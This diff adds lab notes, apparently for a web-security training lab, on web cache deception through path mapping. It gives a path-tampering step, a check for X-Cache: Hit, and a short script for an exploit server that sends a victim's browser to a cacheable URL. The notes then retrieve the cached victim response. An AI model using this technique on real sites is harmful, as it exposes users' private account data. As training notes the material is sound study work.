@@ -1,1 +1,8 @@
-
+Exploting Path Mapping for web-cache Deception ---> Tamper Some parameter like --> GET /dir/file into /dir/file/profile.js
+                                                                               -->If the response contains X-Cache: Hit ---> The information is cached !!
+                                               --->Paste this script in exploit server
+                                                   <script>
+                                                       document.location="https://YOUR-LAB-ID.web-security-academy.net/dir/file/profile.js"
+                                                   </script>
+                                               --->Visit the URL from victims's account 
+                                               --->Click the Link from victim's account and after victim has clicked, go to the link you delivered to the victim 
